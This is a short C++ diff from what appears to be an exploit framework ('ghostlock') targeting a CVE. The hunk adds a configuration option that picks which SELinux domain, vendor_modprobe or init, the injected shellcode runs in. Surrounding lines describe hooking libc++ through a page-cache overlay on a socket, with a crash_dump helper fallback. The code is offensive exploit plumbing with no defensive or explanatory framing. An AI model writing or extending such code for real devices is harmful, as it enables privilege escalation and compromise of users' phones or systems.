@@ -217,6 +217,18 @@ namespace ghostlock::backend::cve_2026_43284 {
         /* libc++ hook: own page-cache face over the carrier session socket, plus
          * the crash_dump helper fallback when the App cannot open the file. */
         ctx.hook_path = steps::kLibcxxPath;
+        /* Shellcode exec-context policy (execution.selinux_exec_context; schema
+         * default 0 = vendor_modprobe). Token 1 (init) selects the init domain
+         * for devices where the vendor_modprobe transition is not usable; any
+         * other value keeps the upstream default. */
+        const uint32_t selinux_exec_context =
+                ghostlock::backend::u32_field_from(document, "selinux_exec_context")
+                        .value_or(static_cast<uint32_t>(
+                                ghostlock::backend::kCve2026_43284SelinuxDefault));
+        ctx.hook_selinux_context =
+                selinux_exec_context == lkm::kSelinuxExecContextInit
+                        ? steps::kLibcxxInitContext
+                        : steps::kLibcxxSelinuxContext;
         ctx.hook_page.sa = sa;
         ctx.hook_page.io = ctx.page.io;
         ctx.hook_page.file_fd = ::open(steps::kLibcxxPath, O_RDONLY | O_CLOEXEC);
